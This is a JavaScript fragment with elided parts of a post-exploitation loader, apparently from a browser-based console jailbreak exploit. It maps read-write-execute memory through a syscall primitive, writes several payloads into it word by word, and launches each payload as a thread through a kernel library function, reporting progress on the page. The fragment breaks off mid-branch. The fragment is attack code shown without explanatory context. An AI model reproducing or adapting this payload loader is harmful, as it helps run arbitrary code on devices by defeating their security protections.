...
var postExploit = function() {
  ...
  try {
	...
	var buffer = p.syscall("sys_mmap", code_addr, 0x300000, 7, 0x41000, -1, 0);
  	  document.getElementById("status").innerHTML = "Preparing Payloads";
		// verify loaded
		if (buffer == '926100000') 
		{
		  for (var n=0;n<payloadA.length;n++)
		  {
			  var ni = n+1;
         	  // setup the stuff
			  document.getElementById("status").innerHTML = "Loading Payload "+(ni.toString());
			  var scePthreadCreate = window.moduleBaseLibKernel.add32(0x115c0);
			  ...
			  // write payload
			  for (var i = 0; i < payloadA[n].length; i++) {
				  p.write4(code_addr.add32(0x100000 + i * 4), payloadA[n][i]);
			  }
			  var createRet = p.fcall(scePthreadCreate, thread, 0, code_addr, 0, thr_name);
			  alert("Payload "+(ni.toString())+" sent");
		  }
		}
		else
		{
